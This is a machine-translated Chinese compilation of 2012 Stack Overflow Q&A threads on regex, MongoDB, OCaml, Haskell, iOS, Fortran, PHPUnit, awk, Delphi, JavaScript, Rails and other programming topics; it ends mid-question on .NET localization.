> 赞同：0
> 
> 时间：2012-04-20T01:55:10.350
> 
> 标签：regex, preg-match, preg-match-all

我试图找出一个 preg_match / php 样式的正则表达式来查找重复的字母数字字符组（任何长度），用逗号分隔？

所以如果我有字符串 "c,b,a,xz,x,b,a,c,xz,x,x,b,a"

将返回重复两个以上值的第一系列字母。我想我需要做一个递归反向引用，也许像

```
<?php
    // lines removed for simplicity
    // test string = "c,b,a,xz,x,b,a,c,xz,x,x,b,a"
    $haystack = "c,b,a,xz,x,b,a,c,xz,x,x,b,a";
    $answer = preg_match('/([A-z]{2,*}[\s]{1})([A-z \s]*)[\1]*/', $haystack );

    echo $answer; // print the first occurrence of the repeating series of two or more
?> 
```

我只需要找到并回显重复的两个或多个值系列的第一次出现。有没有办法递归地使用反向引用，或者更好的方法？

编辑：删除代码呕吐物。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:09:46.190

`'/\b(\w+,\w+),(?:.*,)?\1\b/'`应该管用。它会匹配任何两个项目的序列，任何数量的其他东西，然后再次匹配相同的序列。

关键是，由于正则表达式的工作方式，它可能会找到第一个重复的序列，而不是第一个重复的序列。（最早开始的比赛获胜。）例如，如果你有`'a,b,c,d,c,d,a,b,c'`，`$matches[1]`可能会是`'a,b'`，即使`'c,d'`会更早匹配。

要找到第一个重复项，您必须能够匹配它并在后向断言中对其进行反向引用。如果这甚至是合法的（我怀疑它是合法的），它必须是固定的宽度，然后 PHP 才会让它发生。

**编辑：** 虽然，现在我考虑了一下......如果你*反转字符串*然后使用`'/.*\b(\w+,\w+),(?:.*?,)??\1\b/'`它，它可能会起作用。这围绕着我提到的约束跳舞；将字符串颠倒后，副本出现*在*原始字符串之前，所以现在我们可以匹配副本，然后“稍后”引用它。

表达式的`.*`开头尽可能多地抓取，因此匹配将尽可能靠近反转字符串的结尾（因此，尽可能靠近原始字符串的*开头）。*并且额外`?`的 s 使它们相应的位变得惰性，因此它们尽可能少地匹配。当然，一旦在反转字符串中找到匹配项，您需要反转它才能在原始字符串中获得匹配项。

当然，在 UTF-8 存在的情况下，这可能会彻底崩溃。（再说一次，大多数正则表达式都会。）但是，如果您只是在处理 ASCII，它应该可以工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T04:34:01.833

不是 PHP 专家，但我认为您可以
`~\b([a-zA-Z0-9]{2,})\b(?=.*\b\1\b)~`在 while 循环中使用此正则表达式。

在正文中，您可以在哈希数组中跟踪结果（如果 php 有），
以打印出唯一的系列和位置。捕获缓冲区 1 具有系列。

# mongodb - 如何获取保存的对象/新创建的对象

> ID：10239237
> 
> 赞同：2
> 
> 时间：2012-04-20T01:55:14.403
> 
> 标签：mongodb, nosql

我通常通过创建独特的“代码”来操作对象。（所以我用代码“test”创建了一个对象并使用`objects.find({ code: "test" })`.

我想知道是否可以简单地创建一个新对象，并获取其保存的对象，或者只是在保存后返回其 ObjectId？

如果我们可以这样做就好了： objects.save({ name: "Test Object" });

并得到`{ ObjectId: "47cc67093475061e3d95369d", name: "Test Object" }`回报。

有什么办法吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:26:02.167

这是你要找的吗？

```
> var record = {hello:"goodbye"};
> db.test.save(record);
> record;
{ "hello" : "goodbye", "_id" : ObjectId("4f90c9106aee6e21b4e55c65") } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T02:09:56.393

我认为没有 API 可以从数据库中获取自动生成的 id，也没有真正的需要：

如果您的“代码”确实是独一无二的，您可以将其用作对象 ID。

```
 objects.save({ _id: "test" }); 
```

该`_id`字段不必是 ObjectId 类型，它必须是唯一的。如果您已经有一些主键类型数据，则不必使用自动生成的 id。这样，您还可以保存一个索引。

如果要使用生成的 ObjectId，请在调用 save 之前自行生成：

```
ObjectId id = new ObjectId();   
objects.save({ _id: id, something: 12345 }); 
```

# ocaml - ocamldoc 可以引用类型构造函数吗？

> ID：10239238
> 
> 赞同：3
> 
> 时间：2012-04-20T01:55:17.097
> 
> 标签：ocaml, documentation-generation, ocamldoc

我试图在 ocamldoc 中引用类型构造函数。

例如：

```
type x = Awesome | Boring 
```

稍后我们想参考一些文档中的构造函数之一：

```
(** {!Awesome} is a really great constructor for {!x}.  You should definitely use it instead of {!Boring}. *) 
```

ocamldoc 抱怨：

```
Warning: Element Awesome not found
Warning: Element Boring not found 
```

有没有办法引用类型构造函数，以便 ocamldoc 可以链接到相应的类型？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T07:44:00.727

您不能直接交叉链接到类型构造函数。但是，您可以链接到类型本身：

```
(** {{!x}Awesome} is a really great constructor for {!x}. *) 
```

如果你想要更精确的东西，你可以编写一个小的 ocamldoc 插件来覆盖该`html_of_Ref`方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T07:23:28.927

AFAIK 那是不可能的。[您可以在此处查看](http://caml.inria.fr/pub/docs/manual-ocaml/manual029.html#htoc175)可以使用此语法进行的引用类型。但是，您可以做的是：

```
(** {{!x}[Awesome]} that will at least bring to {!x} by clicking on it. *) 
```

# haskell - Haskell 中的“免等待”数据

> ID：10239239
> 
> 赞同：3
> 
> 时间：2012-04-20T01:55:17.497
> 
> 标签：haskell, concurrency

`TVar`我一直相信s的 GHC 实现是[无锁的](http://en.wikipedia.org/wiki/Non-blocking_algorithm#Lock-freedom)，但不是无[等待的](http://en.wikipedia.org/wiki/Non-blocking_algorithm#Wait-freedom)。是否有任何无需等待的实现（例如 Hackage 上的包）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T07:44:23.830

无等待是分布式计算的一个术语。如果一个线程（或分布式节点）能够正确终止，即使来自其他线程的所有输入在任何时候都被延迟/丢失，则 算法是*无等待的。*

如果您关心一致性，那么您不能保证无等待（假设您总是希望正确终止，即保证可用性）。这是从**CAP 定理**[1] 得出的，因为等待自由本质上意味着分区容忍。

[1] [http://en.wikipedia.org/wiki/CAP_theorem](http://en.wikipedia.org/wiki/CAP_theorem)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:01:12.610

您的问题“是否有任何无需等待的实现？” 有点不完整。STM（因此`TVar`）相当复杂，并且在编译器中内置了支持 - 您无法使用 Haskell 原语正确构建它。

如果您正在寻找任何允许突变并且可以是非阻塞的数据容器，那么您需要`IORef`s 或`MVar`s （但如果没有可用的值，它们可以阻塞）。

# iphone - 加快从 ALAssetsLibrary 读取和填充 UITableView 的可能方法

> ID：10239242
> 
> 赞同：0
> 
> 时间：2012-04-20T01:55:52.347
> 
> 标签：iphone, performance, alassetslibrary, alasset

现在，我正在使用 ALAssetsLibrary 从 ALAssetsGroupSavedPhotos 和 ALAssetsGroupLibrary 收集照片。将所有资产读入一个数组后，我填充我的 UITableView ([myTable reloadData]) 以显示照片。

我发现如果用户有很多照片，延迟就会增加。有什么办法可以加快速度吗？尽管相机胶卷或照片库中的照片数量很多，但默认的 UIIMagePicker 似乎根本没有延迟。有没有办法达到同样的速度？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T11:35:08.220

只需枚举您当前需要使用`enumerateAssetsAtIndexes:(NSIndexSet *)indexSet options:(NSEnumerationOptions)options usingBlock:(ALAssetsGroupEnumerationResultsBlock)enumerationBlock`资产组显示的资产，而不是使用`- (void)enumerateAssetsUsingBlock:(ALAssetsGroupEnumerationResultsBlock)enumerationBlock`

你可以（我想你想填充一个表格视图）例如只是`indexPath.row`在你的`tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath`方法中的索引处枚举资产。

# fortran - OOP Fortran：保存指向意图（IN）变量的指针

> ID：10239243
> 
> 赞同：0
> 
> 时间：2012-04-20T01:55:52.397
> 
> 标签：fortran, fortran90, fortran95, fortran2003

我有一个 Fortran 模块，我想尽可能地遵循 OOP 理念来组织它，同时仍然使其与 Fortran 2003 兼容。这个模块基本上：（a）分配/释放临时数组缓冲区，以及（b）提供一个函数 do_F对一些数据进行操作。这个函数 do_F 使用这些临时缓冲区，但也依赖于几个辅助类型。

我很清楚我应该将缓冲区放入一个类型中，并在适当的时候初始化/释放。但是，由于对 do_F 的每次调用都需要几个参数，所以我确信最好使用的设计策略是什么。

更具体地说，考虑以下实现：

1.  每次调用 do_F 时传递大量类型

    ```
    type object_t
        ! lots of private buffers
        real, allocatable :: buf1(:,:,:), buf2(:,:,:), etc.
    end type object_t

    subroutine init_object(this)
        type(object_t), intent(INOUT) :: this

        allocate( this%buf1(..., ..., ...) )
        !...
    end subroutine init_object

    subroutine do_F(this, data, aux1, aux2, ..., auxN)
        type(object_t), intent(INOUT) :: this
        type(data_t), intent(INOUT) :: data
        type(aux1_t), intent(IN) :: aux1
        !...

        !do stuff on data using the buffers and values stored
        ! in aux1 .. auxN
    end subroutine do_F 
    ```

2.  保存指向 do_F 需要的类型的指针

    ```
     type object_t
        ! lots of private buffers
        real, allocatable :: buf1(:,:,:), buf2(:,:,:), etc.

        ! pointers to auxiliary types
        type(aux1_t), pointer :: aux1_ptr
        !...
    end type object_t

    subroutine init_object(this, aux1, aux2, ..., auxN)
        type(object_t), intent(INOUT) :: this
        type(aux1_t), intent(IN), target :: aux1
        !...

        allocate( this%buf1(..., ..., ...) )
        !...

        this%aux1_ptr => aux1
        !...
    end subroutine init_object

    subroutine do_F(this, data)
        type(object_t), intent(INOUT) :: this
        type(data_t), intent(INOUT) :: data

        !do stuff on data using the buffers and values stored
        ! in this%aux1_ptr .. this%auxN_ptr
    end subroutine do_F 
    ```

我的具体问题是：

1.  实施 #2 有效吗？PGI编译器没有抱怨，但听说函数返回后intent(IN)不再定义好
2.  将此方案与指针一起使用是否会降低性能？即使我不写入这些 aux_ptr，编译器是否能够像 #1 一样优化我的代码？

一些注意事项：

1.  函数 do_F 被调用了大约 100 次，每次调用都需要几分钟，并且对大型数组进行操作。
2.  除了 do_F 之外，还有 do_G 和 do_H 函数对相同的数据进行操作并使用相同的辅助变量。这就是为什么我想首先减少传递给函数的变量数量。
3.  我不想将所有辅助变量组合成一种类型，因为它们在大型 HPC 代码的其余部分中使用。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T05:45:00.207

如果 Intent IN 变量在调用之前，它们在返回之后定义良好。该程序不允许更改它们。一个例外是指针变量的值，您可以在其中更改目标的值，但不能更改`intent(IN)`指针虚拟参数的指针的关联状态。

我不确定效率。快速阅读后，第 2 版看起来更好。

# bash - 使用终端的单行 telnet 命令

> ID：10239246
> 
> 赞同：0
> 
> 时间：2012-04-20T01:56:15.700
> 
> 标签：bash, command-line, telnet

我需要按照“telnet root@192.168.2.99：irinject BACK”的方式进行一些操作，但这无法正常工作。不需要密码。

在 Ubuntu 11.10 上使用终端执行此任务的正确语法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:03:43.833

如果您绝对必须这样做，请使用`echo`or etc. 将命令通过管道传输到`telnet`会话 - 并准备好在机器被黑客入侵时重新安装它们。

强烈推荐`ssh`与密钥访问一起使用；你甚至可以以这种方式包含命令。

```
ssh -i path/to/root-key root@host command 
```

# html - 使用CSS旋转，从左到右依次显示信息

> ID：10239249
> 
> 赞同：0
> 
> 时间：2012-04-20T01:56:44.420
> 
> 标签：html, css, rotation, horizontal-scrolling

好的，这是一个很奇怪的问题，但我创建了一个展示电影的时间线和上映日期，而且我有很多电影想要垂直显示为文本。我希望每部电影彼此相邻出现，从左到右。

这是我目前拥有的-

[http://ignitethatdesign.com/CheckFilm/index1.php](http://ignitethatdesign.com/CheckFilm/index1.php)

这是一个混合混搭，因为我正在播放的第一部电影显示在顶部。

我从数据库中调用数据，如果每部电影发行之间有几天，就会出现一张图像

任何帮助将不胜感激我迷失在 CSS 的海洋中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T05:11:18.150

这在 Flash 中可以很容易地完成，但鉴于趋势正在远离 flash，因此在 html 5 中执行此操作是有意义的。执行此操作的 html 5 方法可能很有趣它在 html 5 画布中。

鉴于这些都不感兴趣，以您目前拥有的东西为例，在javascript中启动一种计时器似乎是个好主意，该计时器将调用一个函数来遍历li并将它们向下移动......

例如

```
var t=setTimeout("moveListItems()", 500); // just adjust the time in milliseconds to make                                           
                                          // it faster or slower.

function moveListItems() {
    // place move list items code here
    //probably a call to update the css "top" 
    $('#horiz_container li').each(function() {
       alert(index + ': ' + $(this).text());
       var newtop = $(this).position().top + 250;
       $(this).css('top', newtop + 'px');
       //check if the top is too low then reset to top to the top of the container
    });

} 
```

注意：未经测试

你可能需要稍微调整一下，让 li 绝对，这样他们就不会在移动时搞砸布局，但这就是我的做法。如果我再这样做，那么我将犯下违反黑客精神的罪行。玩得开心！

# vbscript - vbscript 删除文件夹，其中包含多个带有进度条的文件

> ID：10239253
> 
> 赞同：3
> 
> 时间：2012-04-20T01:57:16.370
> 
> 标签：vbscript

希望他们可能是一种可视化删除多个文件的进度的方法，我有一个应用程序在完成后运行清理，它删除的目录几乎是 3GB，所以有一个类似于的进度条弹出窗口会很好如果您使用

```
Const FOF_CREATEPROGRESSDLG = &H0&

strTargetFolder = "C:\OfficeTemp" 

Set oShell = CreateObject("Shell.Application")
Set objFolder = oShell.NameSpace(strTargetFolder) 

objFolder.CopyHere "OfficeTemp\*.*", FOF_CREATEPROGRESSDLG 
```

据说你可以用 SHFileOperation 来实现它，但我只看到在 C++ 中使用它的例子，有人用 VBScript 做过吗？

[C++ Win32 API 删除带有进度条的文件](https://stackoverflow.com/questions/6339348/c-win32-api-delete-file-with-progress-bar)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T10:19:50.980

如果你想让你的脚本保持敏捷，我的建议是不要这样做。删除所需的时间不是 GB 大小，因此对于几个大文件，它不适合，因为在您启动并运行您的 gui 并显示一些进度之前，您的文件删除已经完成。您只需在文件名被删除时显示文件名。

如果很多小文件需要较长的时间，进度条会更合适，只需要在IE或其他可以编写脚本的浏览器中进行，结果永远不会很可靠也不会很漂亮。我见过提供这样的进度条的 ActiveX 对象，但即使您可以使用这些对象，您也会遇到问题。您需要提前知道要删除的文件数量，并将过程分成小步骤，并将进度显示为总数的百分比。仅此一项可能需要与删除本身一样长的时间，vbscript 处理文件的速度非常慢。在此处显示文件肯定会减慢该过程，您可以显示类似

1000 个文件被删除.. 2000 个文件被删除..

以便用户知道发生了什么事。删除地图的最快方法是让 de OS 处理它，然后等待进程结束并从那里恢复脚本。

对于其中一些方法，我有样品，很抱歉我不能给你和容易解决所有问题的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-12T09:35:55.827

对于在复制时寻找进度条的人，我同时发现了这个，在 Win7 上进行了测试和工作

```
Const FOF_CREATEPROGRESSDLG = &H0&

strTargetFolder = "D:\Scripts" 

Set objShell = CreateObject("Shell.Application")
Set objFolder = objShell.NameSpace(strTargetFolder) 

objFolder.CopyHere "C:\Scripts\*.*", FOF_CREATEPROGRESSDLG 
```

# qt - Qt 设计器 - Qt 4.8.1

> ID：10239254
> 
> 赞同：1
> 
> 时间：2012-04-20T01:57:21.960
> 
> 标签：qt, installation, pyqt4, qt-designer

我不知道如何在 MacOS 上打开 Qt Designer。我是 macOS 的新用户，非常感谢有关如何打开 Qt Designer 的任何帮助。我已经安装了 Qt 4.8.1 库。它不像我在 Finder 中所期望的那样位于“应用程序”中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T07:27:54.637

查看安装程序输出的详细信息 - Qt 不会将自身安装在应用程序文件夹中，而是安装在您的个人文档中，~/QtSDK/... 或类似的东西。我只是安装了两次 Qt，因为我没有在应用程序文件夹中找到 Qt 二进制文件，并查找了详细的安装报告以找出二进制文件的去向。

# iphone - iPhone App中的视频速度

> ID：10239256
> 
> 赞同：0
> 
> 时间：2012-04-20T01:57:40.167
> 
> 标签：iphone, performance, frameworks, media-player

由于某种原因，*setcurrentPlayback*方法不起作用。感谢您的任何想法...

```
-(IBAction)abspielen:(id)sender {

  NSString *titleOfButton = [sender titleForState:UIControlStateNormal];
  NSBundle *bundle = [NSBundle mainBundle];
  NSString *moviePath = [bundle pathForResource:titleOfButton ofType:@"mov"];
  NSURL *movieURL = [ NSURL fileURLWithPath:moviePath];

  MPMoviePlayerController *themovie = 
        [[MPMoviePlayerController alloc]initWithContentURL: movieURL];   

  [themovie play];

  [themovie setCurrentPlaybackRate:2.f];  

  [themovie release];

  MPMoviePlayerViewController *moviePlayer = 
     [[MPMoviePlayerViewController alloc] initWithContentURL:movieURL];
  [self presentMoviePlayerViewControllerAnimated:moviePlayer];

  [moviePlayer release];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T11:21:37.193

添加行

```
themovie.rate=2.f; 
```

insted of `[themovie setCurrentPlaybackRate:2.f];`line 可能是它的工作....

有时在使用 HTML 博客时，这种方法不起作用，所以只需尝试给出 1 行

可能对你有用.... :-)

# java - 向 Jframe 添加控制台

> ID：10239258
> 
> 赞同：6
> 
> 时间：2012-04-20T01:57:59.473
> 
> 标签：java, swing, console, jframe, jbutton

我现在正在开发一个使用扫描仪与用户交互的游戏。游戏是第一个基于文本的，所以 Java 控制台视图是我以前玩的。现在我必须将游戏转换为 Gui 或 Jframe，因此我希望能够在框架内拥有相同的控制台功能，同时还能使用扫描仪。有任何想法吗？我是编码新手，因此将不胜感激任何帮助或相同的代码！谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:25:40.723

您可以创建一个看起来像控制台的 GUI，例如通过一个`JTextArea`用于显示控制台文本和一个`JTextField`用户可以输入他们想要发送到控制台的信息的位置。通过向 中添加一个`KeyListener`，`JTextField`您可以监听用户按下“Enter”，然后将信息发送到控制台。

而不是从控制台读取用户输入（它坐下来等待用户完成输入信息，然后执行操作），您只需侦听“Enter”键，然后调用一个方法，通过您的“JTextField”文本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T02:39:43.253

似乎对这样的组件很感兴趣。以下是关于 SO 的一些其他讨论，并提供了很好的实现方法：

*   [寻找一个高效的基于 Java Swing 的控制台](https://stackoverflow.com/questions/2329455/looking-for-an-efficient-java-swing-based-console)
*   [创建命令控制台](https://stackoverflow.com/questions/1255373/create-a-command-console)
*   [Java Swing 控制台组件](https://stackoverflow.com/questions/2806012/java-swing-console-component)
*   [在 JPanel 中创建 Java 命令控制台](https://stackoverflow.com/questions/970850/create-java-command-console-in-jpanel)

如果您在 Google 上搜索[“摇摆控制台”一词](https://www.google.com/search?sourceid=chrome&ie=UTF-8&q=swing+console)，还会有更多提示。

# php - 如何跳过 PHPunit 中的测试？

> ID：10239264
> 
> 赞同：108
> 
> 时间：2012-04-20T01:59:33.820
> 
> 标签：php, phpunit

我正在将 phpunit 与 jenkins 结合使用，并且我想通过在 XML 文件中设置配置来跳过某些测试`phpunit.xml`

我知道我可以在命令行上使用：

`phpunit --filter testStuffThatBrokeAndIOnlyWantToRunThatOneSingleTest`

`<filters>`由于标签仅用于代码覆盖，如何将其转换为 XML 文件？

我想运行所有测试除了`testStuffThatAlwaysBreaks`

* * *

## 回答 #1

> 赞同：208
> 
> 时间：2012-05-06T18:19:43.883

跳过已损坏或您需要稍后继续工作的测试的最快和最简单的方法是将以下内容添加到单个单元测试的顶部：

```
$this->markTestSkipped('must be revisited.'); 
```

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2012-04-20T03:45:26.490

如果您可以处理忽略整个文件，那么

```
<?xml version="1.0" encoding="UTF-8"?>

<phpunit>

    <testsuites>
        <testsuite name="foo">
            <directory>./tests/</directory>
            <exclude>./tests/path/to/excluded/test.php</exclude>
                ^-------------
        </testsuite>
    </testsuites>

</phpunit> 
```

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2016-02-09T09:44:19.520

有时，根据定义为 php 代码的自定义条件跳过特定文件中的所有测试很有用。您可以使用 setUp 函数轻松地做到这一点，其中 makeTestSkipped 也可以工作。

```
protected function setUp()
{
    if (your_custom_condition) {
        $this->markTestSkipped('all tests in this file are invactive for this server configuration!');
    }
} 
```

*your_custom_condition* can be passed via some static class method/property, a constant defined in phpunit bootstrap file or even a global variable.

# awk - 匹配第一个字段，然后加入该行

> ID：10239265
> 
> 赞同：0
> 
> 时间：2012-04-20T01:59:43.860
> 
> 标签：awk, gawk

我有两个文件.. file1::

```
Adezat
Adm157
Adriaan 
```

文件2::

```
adezat:0f94154bdef31844e7c5e8aaaaaaaaaa:0X!SV
imawesome3:3c84a21b44f49163aa4597aaaaaaaaaa:5VMQX
adm157:1e00152082f4d02af24b16aaaaaaaaaa:@0E2F
imawesome:acdf80e6488ea6154ed9182aaaaaaaaaa:KJP6E
adriaan:74b57d1e76a16637cfa47faaaaaaaaaa:FVW&C 
```

匹配两个文件中的第一个字段后 >> 仅打印 file2:: 中的匹配行

```
adezat:0f94154bdef31844e7c5e8aaaaaaaaaa:0X!SV
adm157:1e00152082f4d02af24b16aaaaaaaaaa:@0E2F
adriaan:74b57d1e76a16637cfa47faaaaaaaaaa:FVW&C 
```

注意我在 Windows 上使用 gawk .. 谢谢

**[我得到了答案](http://www.unix.com/shell-programming-scripting/183299-joining-lines-only-if-1st-field-matches.html)**::

```
gawk -F":" "NR==FNR{a[tolower($1)]++;next}tolower($1) in a" file1 file2 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:15:57.113

使用 grep：

```
grep -i -f file1 file2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:44:09.780

目前不在航站楼，但是：

```
join -t: <(tr 'A-Z' 'a-z' < file1 | sort) <(sort file2) | cut -d: -f 2- 
```

但 grep 会更好

# string - 在 Delphi 2010 中停用巨大的字符串

> ID：10239270
> 
> 赞同：5
> 
> 时间：2012-04-20T02:00:36.047
> 
> 标签：string, delphi, delphi-2010

我是 Delphi 的新手，我正在将一个非常旧的 Delphi 项目迁移到 Embarcadero RAD Studio 2010。我发现使用字符串有问题。这是代码：

```
ProgramaResultadosType = record
    Version: string;
    TituloPrincipal   : string;
    BloquesResultados : VectorBloquesResultadosType;
end;

FileOfProgramaResultadosType  = file of ProgramaResultadosType; 
```

而错误...

> “E2155 类型 '%s' 需要最终确定 - 文件类型中不允许”

我知道当您不指定字符串大小时，对于许多 delphi 开发人员来说，这是一个众所周知的错误。

基本上我想像旧版本的 RAD Studio 一样停用 Huge strings 指令，但我在 2010 版本中找不到。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T05:10:29.833

只需使用：

```
ProgramaResultadosType = record
    Version: shortstring;
    TituloPrincipal   : shortstring;
    BloquesResultados : VectorBloquesResultadosType;
end; 
```

但请注意：

*   几乎每次调用 RTL 函数都会首先对新`string`类型进行不可见的转换：您最好`string`在读取`shortstring`内容后立即使用另一个显式变量；
*   在较新版本的 Delphi 中（从 Delphi 2009 开始），`string`是一个 Unicode 字符串：所以当从 ; 写入 a `shortstring`（这是一个 Ansi 字符串）时，您可能会丢失一些数据`UnicodeString`；
*   `ProgramaResultadosType = packed record`如果您的应用程序非常旧（默认对齐方式在 Delphi 4 前后更改，AFAIR），可能需要添加。

因此，您可能必须：

*   使用上述结构读取现有内容；
*   使用新的范式编写，Unicode 就绪（例如，像 Midas、SQLite3 或任何其他的嵌入式数据库）。

将现有应用程序转换为较新的 Unicode 版本的 Delphi 时值得一读：

*   [系列文章](http://delphi.about.com/od/objectpascalide/a/understanding-unicode-support-in-delphi.htm)；
*   [Marco 的介绍](http://edn.embarcadero.com/article/images/38980/Delphi_and_Unicode.pdf)；
*   [Delphi Unicode 迁移仅适用于凡人：前线的故事和建议](http://www.embarcadero.com/images/dm/technical-papers/delphi-unicode-migration.pdf)。

# javascript - 添加到以逗号分隔的值

> ID：10239274
> 
> 赞同：-5
> 
> 时间：2012-04-20T02:00:55.890
> 
> 标签：javascript

我搜索了一个解决方案，但找不到，

我有当前的脚本，数字是随机的（以不同的数量变化），

```
var totalAmount = [55.99,7.00]; 
```

我正在尝试将用逗号分隔的两个值相加，例如“ `totalAmout = 62.99;`”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T02:08:15.693

您将其更改为数组。`.push()`您可以使用;添加到 javascript 中的数组中。

```
var totalAmount = [55.99, 7.01];
totalAmount.push(5);
console.log(totalAmount); // produces something like [55.99, 7.01, 5] 
```

[编辑]是的，问题的整个格式让我失望。如果你想要一个数字数组的 SUM，你可以使用 for 循环来做到这一点：

```
var total = 0;
for (var i = 0; i < totalAmount.length; i++)
    total += parseFloat(totalAmount[i]);
} 
```

`total`将有数组的总和，它适用于任何长度的数组。如果我们没有 parseFloat，它可能会做一些奇怪的事情，因为连接和加法运算符都`+`在 JavaScript 中。所以我们这样做`parseFloat(totalAmount[i])`了，这将确保即使你`"55.55"`的数组​​中有一个字符串，它也会被用作数字而不是字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:12:19.560

当然，试试这个：

```
var totalAmount = [55.99,7.00];
var sum = totalAmount[0] + totalAmount[1]; //Add array elements 0 and 1 
```

这当然假设您的数组至少有两个元素。

# ruby-on-rails - Rails 3.1+ 嵌套表单问题：无法批量分配受保护的属性

> ID：10239285
> 
> 赞同：1
> 
> 时间：2012-04-20T02:04:00.417
> 
> 标签：ruby-on-rails, ruby-on-rails-3.1, nested-forms, nested-attributes, simple-form

我有一个篮球应用程序，其中一个名册有很多球员，一个球员可以在多个名册上。（多对多的原因是球员名册存档）

**名册.rb**

```
class Roster < ActiveRecord::Base
      belongs_to :team
      has_many :rosterizes
      has_many :players, :through => :rosterizes
      accepts_nested_attributes_for :players
      attr_accessible :jersey_number, :team_id, :class_year, :players
    end 
```

**Rosterizes.rb**（名字不好我知道......）

```
class Rosterize < ActiveRecord::Base
  belongs_to :player
  belongs_to :roster
  attr_accessible :player_id, :roster_id
end 
```

**播放器.rb**

```
class Player < ActiveRecord::Base
  has_many :rosterizes
  has_many :rosters, :through => :rosterizes
  validates_presence_of :first_name, :last_name
  attr_accessible :first_name, :last_name, :active
end 
```

**风景**

```
<div class="well">
    <h2>New Player</h2>
    <%= simple_form_for @roster, :url =>player_added_team_path, :html => { :class => 'form-horizontal' } do |f| %>
        <%= f.simple_fields_for @new_player do |x| %>
            <%= x.input :first_name %>
            <%= x.input :last_name %>
        <%end%>
        <%=f.input :class_year %>       
        <%=f.input :jersey_number %>
        <%=f.input :team_id, :as => :hidden, :input_html => {:value => params[:id]}%>

        <div class="well">
        <%= f.button :submit, :class => 'btn-primary icon-plus-sign btn-success', :value => "Add To Team" %>
        </div>
    <%end%>
</div> 
```

**我发送给控制器的参数：**

```
"roster"=>{"player"=>{"first_name"=>"first name", "last_name"=>"last name"}, "class_year"=>"freshman", "jersey_number"=>"23", "team_id"=>"1"}, "commit"=>"Add To Team", "id"=>"1"} 
```

**处理保存的控制器：**

```
def player_added
   @team = Team.find(params[:id])

   #where the issue is happening
   @roster = @team.rosters.build(params[:roster])
   @roster.save
   ...

end 
```

我有一个使用参数的工作，**但**我想了解我在这里做错了什么以供将来/学习目的以及它为什么给我：无法批量分配受保护的属性

**我的工作（有点hacky）：**

```
def player_added

    @team = Team.find(params[:id])
    @roster = @team.rosters.build(:class_year => params[:roster][:class_year], :jersey_number => params[:roster][:jersey_number])
    @new_player = @roster.players.build(:first_name => params[:roster][:player][:first_name], :last_name => params[:roster][:player][:last_name])

    @roster.save
    @new_player.save

    ...

end 
```

我正在使用 Simple_Form 2.0 ...

我知道这是很多信息，但提前谢谢你！

**解决方案**

以防万一其他人遇到与我相同/相似的问题...

我安装了这个插件=> [https://github.com/ryanb/nested_form](https://github.com/ryanb/nested_form)

所以这是我所做的更改：

**名册.rb**

```
class Roster < ActiveRecord::Base
  belongs_to :team
  has_many :rosterizes
  has_many :players, :through => :rosterizes
  accepts_nested_attributes_for :players
  attr_accessible :jersey_number, :class_year, :players, :player_attributes
end 
```

我还将视图更改为：

```
 <%= simple_nested_form_for @roster, :url =>player_added_team_path, :html => { :class => 'form-horizontal' } do |f| %>
      <%= f.simple_fields_for :players, @roster.players.build do |x| %>
           # nested form
           ...
      <%end%>
      # form
      ...
<%end%> 
```

**保存 def player_added 的**控制器****

 **```
@team = Team.find(params[:id])
@roster = @team.rosters.build(params[:roster])
@roster.save

... 
```

结尾

这让我很难理解，希望这会减少你们中任何人寻找答案/学习嵌套表格的时间！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T02:41:53.720

问题在于您命名嵌套关联属性的方式以及您发送的参数：

嵌套的属性`:players`应该是`:players_attributes`，并且`:team_id`不应该被列出（因为它覆盖了团队关联 rails 魔法）：

```
attr_accessible :jersey_number, :class_year, :players_attributes 
```

参数应具有以下格式：

```
"roster"=>{"players_attributes"=>[{"first_name"=>"first name", "last_name"=>"last name"}], "class_year"=>"freshman", "jersey_number"=>"23"}, "commit"=>"Add To Team", "id"=>"1"} 
```

为此，您可能应该更改`simple_form_for @roster`为`simple_nested_form_for @roster`

请注意，您不需要`"team_id"`在参数中包含该属性，`"roster"`因为您已经在加载名册并将其关联到它。**

# c# - .NET 本地化失败

> ID：10239286
> 
> 赞同：2
> 
> 时间：2012-04-20T02:04:09.377
> 
> 标签：c#, .net, wpf, localization, cultureinfo

我目前正在用 C# 和 WPF 编写一个 .NET 4 应用程序。

我包括 15 种语言的本地化。这基本上涉及创建一堆资源，创建几个 CultureInfo 实例，并将它们分配给 Thread.CurrentThread.CurrentCulture 和 Thread.CurrentThread.CurrenUICulture。对于每一个我播种两个字符的中性文化代码（例如，英语的“en”），然后在分配 CultureInfo 的每个实例之前调用 .CreateSpecificCulture。

